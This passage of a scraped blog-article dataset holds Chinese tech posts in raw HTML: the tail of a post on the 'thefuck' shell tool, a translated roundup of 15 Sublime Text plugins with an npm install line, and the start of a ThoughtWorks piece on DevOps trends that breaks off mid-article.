class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsource ~/.bashrc \r\n或 \r\nsource ~/.zshrc</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f07630b358817791-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f07630b358817791-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f07630b358817791-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f07630b358817791-1\"><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">bashrc</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f07630b358817791-2\">或 </div><div class=\"crayon-line\" id=\"crayon-594b05f07630b358817791-3\"><span class=\"crayon-v\">source</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">zshrc</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3>它是怎么让我念头通达的？</h3>\n<p>thefuck 这个软件包包含了<a href=\"https://github.com/nvbn/thefuck#how-it-works\">上百个匹配规则</a>，专门用来修改你的那些错误，贴心地将它们修改成应该的样子！</p>\n<p>具体有哪些规则，你可以看看<a href=\"https://github.com/nvbn/thefuck#how-it-works\">这里</a>，或者试试就知道了。</p>\n<p>当然，如果你经常犯一些<a href=\"https://github.com/nvbn/thefuck/issues\">独特的错误</a>，你也可以建立自己的规则，而且不妨<a href=\"https://github.com/nvbn/thefuck/pulls\">提交拉取请求</a>给这个项目，找到和你一样独特的小伙伴们。</p>\n<p>还等什么？赶快去<strong>装</strong>啊！</p>\n<p>（本文中的例子和图片来自<a href=\"https://github.com/nvbn/thefuck\">该项目</a>。）</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111096\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111096votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111096\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 9 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx1.sinaimg.cn/large/63918611gy1ff9im31jvbj20p00d2whb.jpg"], "fav_nums": 9, "comment_nums": 2, "create_date": "2017/05/04", "praise_nums": 2}
{"tags": "Sublime Text,工具与资源", "front_image_path": "full/bffdf71812c2dbc79d511c6ac624756024e1c358.jpg", "title": "15 款炫酷的 Sublime Text 插件推荐", "url_object_id": "3695f152ab74980f8bde238a086f1d5a", "url": "http://blog.jobbole.com/111093/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://tutorialzine.com/2016/10/15-awesome-sublime-text-plugins-for-web-development/\">Danny Markov </a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/15-awesome-sublime-text-plugins-for-web-development\">oschina</a>   </div><div>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/f98dd868ccd74543e0be0fd723a5e83f.png\"></p>\n<p>Sublime Text 是目前最受欢迎的代码编辑器，因其高效、简洁和插件丰富等特点受到开发者的喜爱。</p>\n<p>为了帮助大家充分利用 Sublime 的优势，本文筛选了开发者日常使用较多的 15 款 Sublime Text 插件。如果您有更好的项目推荐，欢迎留言分享。</p>\n<h3><a href=\"https://packagecontrol.io/packages/Package%20Control\" target=\"_blank\" rel=\"nofollow\">Package Control</a></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/1221200073d9a31fa2f643eb92d67e84.png\"></p>\n<p>这是 Sublime 的插件管理器，可以为安装和删除软件包带来方便。如果你尚未安装此插件，建议先安装，以便于试用文中提及的其他插件。</p>\n<h3><a href=\"https://packagecontrol.io/packages/JavaScript%20%26%20NodeJS%20Snippets\" target=\"_blank\" rel=\"nofollow\">JavaScript &amp; NodeJS Snippets</a></h3>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ff9haixkdsg20lt0aaq3n.gif\" width=\"785\" height=\"370\"></p>\n<p>这是用以编写常见 JavaScript 表达式的快捷方式集合。不用编写 document.querySelector(‘selector’)，你只需键入 qs，按下 Tab 键，Sublime 就能帮你完成其余的工作。</p>\n<h3><a href=\"https://packagecontrol.io/packages/Emmet\" target=\"_blank\" rel=\"nofollow\">Emmet</a></h3>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ff9haj92m3g20lt0aat8v.gif\" width=\"785\" height=\"370\"></p>\n<p>与前面提到的插件类似，这是一组专门用来提高书写代码速度的便利工具，不同之处在于 Emmet 适用于 HTML 和 CSS 。将它整合进文本编辑器，可以提供一些功能和快捷方式，加快开发速度。它提供包括 Eclipse、IDEA、UltraEdit、SlickEdit 等的插件。</p>\n<p>Emmet 有点复杂，如果你想要一款更简单的插件，我推荐 <a href=\"https://packagecontrol.io/packages/HTML%20Page%20Snippets\" target=\"_blank\" rel=\"nofollow\">HTML Snippets</a>，它的功能相对较少，但是使用方便，还有很好的直接文档。</p>\n<h3><a href=\"https://packagecontrol.io/packages/AdvancedNewFile\" target=\"_blank\" rel=\"nofollow\">Advanced New File</a></h3>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ff9hajmfkmg20lt0aa75y.gif\" width=\"785\" height=\"370\"></p>\n<p>这个牛X的软件包可以快速创建新文件。你无需浏览文件件或点击菜单，只要打开 super+alt+n 提示，然后将路径写给新文件即可。该插件能自动创建路径中不存在的目录，还能自动补全文件名称。</p>\n<h3><a href=\"https://packagecontrol.io/packages/Git\" target=\"_blank\" rel=\"nofollow\">Git</a></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/9a87f47267d51675b03bc3d83505c5b0.png\"></p>\n<p>在 Sublime Text 的命令行面板上，Git 集成可以直接进行工作。这个包提供了快速访问大量 Git 的常用命令，它允许开发者直接添加文件，提交或者打开 Git 日志，而不需要离开 Sublime。</p>\n<h3><a href=\"https://packagecontrol.io/packages/GitGutter\" target=\"_blank\" rel=\"nofollow\">GitGutter</a></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/96f03d97d3d4531cb45c0aecb5c0cbc9.png\"></p>\n<p>这是非常有用的扩展，它标记了源代码的每一行，告诉你，它的 Git 状态，还给出了你一个发生了的变更梗概。GitGutter 还可以将，git 的HEAD，origin，你选择的分支，或者甚至是某一次的提交与你的文件进行比较。</p>\n<h3></h3>\n<h3><a href=\"https://packagecontrol.io/packages/SideBarEnhancements\" target=\"_blank\" rel=\"nofollow\">Side Bar Enhancement</a></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/88c04a36e2316593006a64d980a411e0.png\"></p>\n<p>你正在 Sublime Text 中处理的项目工程可以在左侧的面板中进行概览。尽管它给你提供了一些操作文件的选项，但是可选的操作相当有限。该插件通过向右键菜单增加了超过20多个选项来改变了这一现状, 其中就包括了在浏览器中打开（<em>Open in browser）</em>,复制（<em>duplicate）</em>, 以及许多其它的实用功能。</p>\n<h3><a href=\"https://packagecontrol.io/packages/ColorPicker\" target=\"_blank\" rel=\"nofollow\">ColorPicker</a></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/86076aade7a869428a4ac51b6a04829b.png\"></p>\n<p>这是一个小巧实用的颜色拾取器，很容易上手，非常适合用来快速地抓取颜色的16进制值。插件会打开一个独立的窗口，你可以从一个调色板上选择一种颜色，或者使用滴管直接从屏幕上的任何位置拾取颜色。</p>\n<h3><a href=\"https://packagecontrol.io/packages/Placeholders\" target=\"_blank\" rel=\"nofollow\">Placeholders</a></h3>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ff9hajvgjpg20lt0aaglm.gif\" width=\"785\" height=\"370\"></p>\n<p>Sublime Text 3 有一个内置 Lorem Ipsum 生成器，可用于创建虚拟文本。Placeholders 插件对这一功能进行了扩展，并允许 ST 快速生成占位符图像，表单，列表和表格。</p>\n<h3><a href=\"https://packagecontrol.io/packages/DocBlockr\" target=\"_blank\" rel=\"nofollow\">DocBlockr</a></h3>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/large/63918611gy1ff9hakf7wxg20lt0aadg9.gif\" width=\"785\" height=\"370\"></p>\n<p>DocBlockr 可轻松为函数生成描述，包括它们所运用的参数，返回的值和变量类型。非常适合那些喜欢给函数定义添加详细描述的用户。</p>\n<h3><a href=\"https://packagecontrol.io/packages/SublimeCodeIntel\" target=\"_blank\" rel=\"nofollow\">SublimeCodeIntel</a></h3>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ff9hal5f2ng20lt0aajsb.gif\" width=\"785\" height=\"370\"></p>\n<p>代码智能插件会对你的源代码文件进行索引，让你能快速的找到并跳转到函数的声明。该扩展对于流行较广以及不那么流行的编程语言都比较适用。</p>\n<h3><a href=\"https://packagecontrol.io/packages/Minify\" target=\"_blank\" rel=\"nofollow\">Minify</a></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/a4b409c84a63a304f39974d4e91b3061.png\"></p>\n<p>这是一个代码压缩器和美化器的二合一插件。Minify 会用你目前正在打开的文件创建出一个新的 .min 或者 .pretty 版本，并且会放在同级目录之下。可用于 CSS, HTML, JavaScript, JSON 还有SVGs。</p>\n<p>这个要依赖外部的 node.js 库来进行压缩和美化, 所以你需要单独安装它们：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b47be41f8a953130981\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nnpm install -g clean-css uglifycss js-beautify html-minifier uglify-js minjson svgo</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b47be41f8a953130981-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b47be41f8a953130981-1\"><span class=\"crayon-i\">npm</span> <span class=\"crayon-i\">install</span> <span class=\"crayon-o\">-</span><span class=\"crayon-i\">g</span> <span class=\"crayon-v\">clean</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">css</span> <span class=\"crayon-i\">uglifycss</span> <span class=\"crayon-v\">js</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">beautify</span> <span class=\"crayon-v\">html</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">minifier</span> <span class=\"crayon-v\">uglify</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">js</span> <span class=\"crayon-i\">minjson</span> <span class=\"crayon-v\">svgo</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p></p>\n<h3><a href=\"https://packagecontrol.io/packages/SublimeLinter\" target=\"_blank\" rel=\"nofollow\">Sublime Linter</a></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/0df6bffdb2e084ba020ed7a9e8cd32da.png\"></p>\n<p>这个包让代码编辑器能够对语法错误，不好的编码实践以及其它一些开发人员可能会犯的错误进行检查。SublimeLinter 本身所扮演的只是一个检查功能的基础框架，所以针对你所使用的每种语言，还需要安装单独的<a href=\"https://packagecontrol.io/search/sublime%20linter\" target=\"_blank\" rel=\"nofollow\">插件</a>。</p>\n<h3><a href=\"https://packagecontrol.io/packages/Color%20Highlighter\" target=\"_blank\" rel=\"nofollow\">Color Highlighter</a></h3>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ff9hale04vg20lt0aagmh.gif\" width=\"785\" height=\"370\"></p>\n<p>这是一项你可以在许多其它的IDE或者文本编辑器中看到的功能, 但是 Sublime 里面却没有, 它就是着色预览功能。使用 Color Highlighter 扩展，你就能在 ST 中启用该功能了, 然后就可以直接在样式表中看到十六进制和 RGBA 值是如何被转成颜色的。</p>\n<h3><a href=\"https://packagecontrol.io/browse/labels/language%20syntax\" target=\"_blank\" rel=\"nofollow\">语言支持包</a></h3>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/106c8346d24f0e65b35cbd729eecfa7c.png\"></p>\n<p>Sublime 可以为超过50种语言提供代码高亮，但是仍然有一些框架或新 Web 语言尚未得到支持。幸好编辑器支持插件，社区可以为任何能想到的语言开发并发布语言包。</p>\n<ul>\n<li><a href=\"https://packagecontrol.io/packages/AngularJS\" target=\"_blank\" rel=\"nofollow\">AngularJS</a></li>\n<li><a href=\"https://packagecontrol.io/packages/TypeScript\" target=\"_blank\" rel=\"nofollow\">TypeScript</a></li>\n<li><a href=\"https://packagecontrol.io/packages/Babel\" target=\"_blank\" rel=\"nofollow\">Babel (React)</a></li>\n</ul>\n<h3>补充：主题</h3>\n<p>为文本编辑器安装一款漂亮的主题会让写代码编写变得更加愉悦。社区拥有许多很不错的 Sublime text 主题和配色，这里列出了我们最喜欢的一些：</p>\n<ul>\n<li><a href=\"https://packagecontrol.io/packages/Agila%20Theme\" target=\"_blank\" rel=\"nofollow\">Agila</a> (截图中使用的主题)</li>\n<li><a href=\"https://packagecontrol.io/packages/Material%20Theme\" target=\"_blank\" rel=\"nofollow\">Material Theme</a></li>\n<li><a href=\"https://packagecontrol.io/packages/Theme%20-%20Brogrammer\" target=\"_blank\" rel=\"nofollow\">Brogrammer</a></li>\n</ul>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111093\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111093votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111093\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 14 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/f98dd868ccd74543e0be0fd723a5e83f.png"], "fav_nums": 14, "comment_nums": 0, "create_date": "2017/05/04", "praise_nums": 3}
{"tags": "DevOps,IT技术", "front_image_path": "full/4efecb1423ec0b1164163e6fc29cc2d280e0c1c1.jpg", "title": "DevOps 发展的 9 个趋势", "url_object_id": "df9a3ff79cd621cf19fbd8cb5faf6985", "url": "http://blog.jobbole.com/111064/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/thoughtworkschina\">ThoughtWorks</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><div>\n<p>DevOps包含了太多方面的技术和实践，很难通过一个统一的工具链来描述其发展。即便如此，我们仍然可以从ThoughtWorks技术雷达的条目变动中看出一些趋势。今年，我有幸作为主编参与了最新一期技术雷达的译制，作为DevOps的爱好者，十分高兴能在这一过程中看到DevOps未来发展的几个趋势，总结成了这篇文章。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/1-DevOps.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/1-DevOps-1024x426.jpg\" alt=\"\" width=\"700\" height=\"291\"></a></p>\n<h3>趋势1：微服务目前仍然是DevOps技术应用和发展的主要领域</h3>\n<p>微服务将单块应用系统切割为多个简单独立的应用。从技术上说，这是通过工具把应用程序的内部复杂度转化为外部复杂度，需要一系列工具支撑微服务本身以及服务之间的通信。从组织上说，微服务团队要满足“快速发布，独立部署”的能力，则必须具备DevOps的工作方式。</p>\n<p>如何拆解微服务一直是微服务技术应用的最大难点之一，<strong>领域驱动设计</strong>是比较理想的微服务拆解方法论。<strong>社会化代码分析</strong>帮助团队通过更精确的数据找到更加合适的拆分点。<a href=\"https://codescene.io/\">CodeScene</a>是一个在线服务，它能帮助识别出热点和复杂且难以维护的子系统，通过分析分布式子系统在时间上的耦合发现子系统之间的耦合。此外，它还能帮你认识组织中的康威定律，这会大大降低微服务解耦的难度。</p>\n<p>此外，微服务系统本质上是一个分布式系统，分布式系统之间的通信一直是很重要的问题。本期介绍的 <a href=\"http://docs.confluent.io/3.0.0/streams/\">Kafka Streams</a> 和 <a href=\"http://opentracing.io/\">OpenTracing</a> 就是这类技术的条目。Kafka作为一个成熟的分布式消息系统已经被广泛采用，而Kafka Streams则将最佳实践以“库”的方式呈现给开发人员，使得操作Kafka更加自然和简单。而OpenTracing则弥补了跨越多个微服务之间请求追踪的空白。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/2-OpenTracing.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/2-OpenTracing-1024x643.jpg\" alt=\"\" width=\"700\" height=\"440\"></a></p>\n<p>另一方面，<strong>无服务器风格的架构（Serverless architecture）</strong>把DevOps技术在微服务领域的应用推向极致。当应用程序执行环境的管理被新的编程模型和平台取代后，团队的交付生产率得到了进一步的提升。一方面它免去了很多环境管理的工作，包括设备、网络、主机以及对应的软件和配置工作，使得软件运行时环境更加稳定。另一方面，它大大降低了团队采用DevOps的技术门槛。</p>\n<p>然而，端到端交付以及微服务中的函数管理问题日渐突出。尽管<a href=\"https://aws.amazon.com/cn/api-gateway/\">AWS API gateway</a>和<a href=\"https://aws.amazon.com/cn/lambda/\">AWS Lambda</a>几乎成了Serverless架构的代名词，但这二者结合的开发者体验并不佳。于是出现了<a href=\"https://serverless.com/\">Serverless framework</a>和<a href=\"https://claudiajs.com/\">CLAUDIA</a>这样的管理工具。</p>\n<p>AWS Lambda带来的优势也深深影响了企业级应用领域，<a href=\"http://openwhisk.org/\">Apache OpenWhisk</a>就是企业级无服务器领域的选择之一，它使得企业级应用也可以采用无服务器风格的架构构建应用程序。</p>\n<p>在微服务端到端交付流程上，Netflix开源了自家的<a href=\"http://www.spinnaker.io/\">Spinnaker</a>，Netflix作为微服务实践的先锋，不断推出新的开源工具来弥补社区中微服务技术和最佳实践的缺失。而<a href=\"http://projects.spring.io/spring-cloud/\">Spring Cloud</a>则为开发者提供了一系列工具，以便他们在所熟悉的Spring技术栈下使用这些服务协调技术(coordination techniques)，如服务发现、负载均衡、熔断和健康检查。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/3-Keycloak-1.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/3-Keycloak-1-1024x612.jpg\" alt=\"\" width=\"700\" height=\"418\"></a></p>\n<p>而在微服务的安全上，最常见的需求之一 是通过身份验证和授权功能来保护服务或API。这部分功能往往是最重要且不断重复构造的。而<a href=\"http://www.keycloak.org/\">Keycloak</a>就是一个开源的身份和访问管理解决方案，用于确保应用程序或微服务的安全。且几乎不需要编写代码，开箱即用。它支持单点登录，社交网络登录和标准协议登录(如OpenID Connect，OAuth2和SAML等)。</p>\n<h3>趋势2：以Docker为核心的数据中心方案逐渐走向成熟</h3>\n<p>在过去的两年，Docker社区有了突飞猛进的发展，似乎每期技术雷达都会出现Docker相关的条目。而Docker往往和DevOps联系起来，被认为是推动DevOps发展的杀手级工具，以至于有些人会以团队是否采用Docker作为团队是否具备DevOps能力的标志。</p>\n<p>而这一社区的创新数量则日渐平缓。一方面，开源社区激烈的竞争淘汰了一部分技术。另一方面，以Docker为中心的完整数据中心解决方案在不断的整合开源社区的零散工具并形成最佳实践。为端到端的开发和运维提供更完整的交付体验，各大厂商也相继开始推广自己的企业级整体收费解决方案，这表明Docker的使用已经走向成熟。</p>\n<p>在本期的技术雷达里的条目中出现了<a href=\"https://mesosphere.com/product/\">Mesosphere DC/OS</a>，这是构建统一技术栈数据中心的一个征兆。在这方面<a href=\"https://docs.docker.com/enterprise/\">Docker EE</a>和<a href=\"http://rancher.com/\">Rancher</a>都是非常有力的竞争者。根据我的判断，在未来的Docker社区里，统一容器化数据中心的竞争者将会进一步减少。而之前的私有云方案则慢慢会被“以Docker为核心数据中心级全栈交付”取代。</p>\n<h3>趋势3：不完整的DevOps实践阻碍着DevOps的发展</h3>\n<p>很遗憾看到<a href=\"https://www.thoughtworks.com/radar/techniques/a-single-ci-instance-for-all-teams\">单一持续集成实例</a>和<a href=\"https://www.thoughtworks.com/radar/techniques/ci-theatre\">不完整的持续集成</a><a href=\"https://www.thoughtworks.com/radar/techniques/ci-theatre\">（CI Theatre）</a>这样的条目出现在技术雷达里。可以感到企业应用DevOps技术的紧迫性。这同时也暴露了DevOps领域里“缺乏门槛较低且成熟的技术实践”的问题。</p>\n<p>大部分企业在DevOps转型中仅仅关注到了工具的升级。却忽视了价值流、生产流程中各个活动中的最佳实践以及DevOps团队文化的构建，这会使团队陷入“已经完成DevOps转型的假象“，而停止了团队的自我改进。</p>\n<p>DevOps的实践包含组织改进和技术升级两个部分，技术往往是最容易的部分。而缺乏组织改进的技术提升往往很难给组织带来质的飞跃。具备DevOps文化的团队则会不断反思和学习，通过共担责任和相互合作不断完善组织的DevOps实践。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/4-introspection.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/4-introspection.png\" alt=\"\" width=\"859\" height=\"512\"></a></p>\n<h3>趋势4：领域特定的DevOps实践开始出现</h3>\n<p>DevOps的最早实践来自于互联网企业的Web应用，相应的思想被引入企业级应用并促进了一系列工具的发展。虽然并不是每一种应用软件交付形式都适合DevOps，但随着DevOps的工具不断成熟。其它领域的DevOps实践也开始尝试借鉴Web应用领域的自动化工具，并逐渐形成领域级的DevOps实践。</p>\n<p>在人工智能领域，<a href=\"https://www.tensorflow.org/\">TensorFlow</a>就是这样一个例子，它可以有多种DevOps友好的安装和部署方式 ，例如采用Docker进行部署。</p>\n<p>在区块链领域，超级账本(<a href=\"https://www.hyperledger.org/\">HYPERLEDGER</a>) 就是这样一个例子，它提供了一套工具和服务，结合DevOps相关技术和实践形成了一个完整的解决方案。</p>\n<p>随着DevOps相关概念和技术不断向各个产业领域的深入发展，可以看到DevOps技术和实践带来的巨大影响力。然而，每个技术领域都有自己所关注的特性，并不是以往的DevOps实践可以全覆盖到的，这恰恰成为了DevOps技术和实践发展的契机。我很期待领域特定的DevOps技术实践给DevOps带来的发展。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/5-HYPERLEDGER.jpg\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/5-HYPERLEDGER-1024x492.jpg\" alt=\"\" width=\"700\" height=\"336\"></a></p>\n<h3>趋势5：采用DevOps进行技术债务重组和技术资产管理</h3>\n<p>技术债务类似于金融债务，它也会产生利息，这里的利息其实就是指由于鲁莽的设计决策导致需要在未来的开发中付出更多的努力。</p>\n<p>投资银行业往往采用多种金融工具组合的方式来处理企业的不良债务。而清理技术债务的实践和工具却乏善可陈。</p>\n<p>技术债务不光阻碍了企业通过新技术带来便利，还使企业偿还技术债务所承担的成本越来越高，例如技术人才的流失，技术利息等综合性风险。</p>\n<p>虽然极少会出现企业因技术债务而走向衰败的案例，但新晋企业凭借新技术和商业模式颠覆传统行业并夺取市场份额的报道却不断发生。 这从另一方面说明技术债务综合提升了采用新技术的机会成本，使企业不断失去创新和领先的巨大潜力。</p>\n<p>DevOps技术栈的多元化为分散遗留系统技术债务风险提供了一套灵活而又低风险的工具和方法论。不断帮助企业从遗留系统的负担中解脱出来。</p>\n<p><a href=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/6-Vagrant-1.png\"><img src=\"http://insights.thoughtworkers.org/wp-content/uploads/2017/04/6-Vagrant-1-1024x513.png\" alt=\"\" width=\"700\" height=\"351\"></a></p>\n<p>而微服务则是首先通过领域拆分技术债，并用相应工具重组技术债。分离优质技术资产和不良资产，通过分散风险来降低抛弃成本。 而将API当做产品(<a href=\"https://www.thoughtworks.com/radar/techniques/apis-as-a-product\">APIs as a product</a>)可以从一个全新的演进视角去看待技术债，通过可用性测试和用户体验研究帮企业剥离出技术债务中的优质资产和不良资产。</p>\n<p>另一方面，本期技术雷达中出现了<a 